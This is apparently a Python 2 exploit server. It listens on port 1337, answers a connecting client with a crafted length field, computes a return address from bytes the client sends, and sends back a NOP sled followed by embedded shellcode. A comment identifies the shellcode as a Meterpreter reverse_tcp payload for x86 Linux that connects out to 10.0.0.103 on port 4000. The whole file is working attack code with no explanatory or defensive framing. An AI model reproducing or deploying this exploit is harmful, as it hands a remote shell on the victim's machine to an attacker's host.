import SocketServer
import struct 
import hexdump

# buf is meterpreter reverse_tcp for x86 linux to port 4000 and ip 10.0.0.103
buf =  ""
buf += "\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0"
buf += "\x66\x89\xe1\xcd\x80\x97\x5b\x68\x0a\x00\x00\x67\x68"
buf += "\x02\x00\x0f\xa0\x89\xe1\x6a\x66\x58\x50\x51\x57\x89"
buf += "\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2"
buf += "\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd"
buf += "\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00"
buf += "\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80"
buf += "\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd"
buf += "\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb"
buf += "\x01\x00\x00\x00\xcd\x80"


class MyTCPHandler(SocketServer.BaseRequestHandler):
    """
    The request handler class for our server.

    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the
    client.
    """

    def handle(self):
        # self.request is the TCP socket connected to the client
        self.data = self.request.recv(1024).strip()

        print "recv data size = %d" % len( self.data )

        resp = struct.pack("<L", len( self.data ) + 0xff0)

        self.request.sendall( resp )

        value = self.data[8:12]
        value = struct.unpack( "<L", value )[ 0 ]
        print "value = %x" % value
        value -= 0x1000
        print "value = %x" % value

        value = struct.pack( "<L", value )

	payload = '\x90' * 12 + value + "\x90" * 0x200 + buf

	self.request.sendall( payload )

if __name__ == "__main__":

    HOST, PORT = "0.0.0.0", 1337

    server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)

    server.serve_forever()
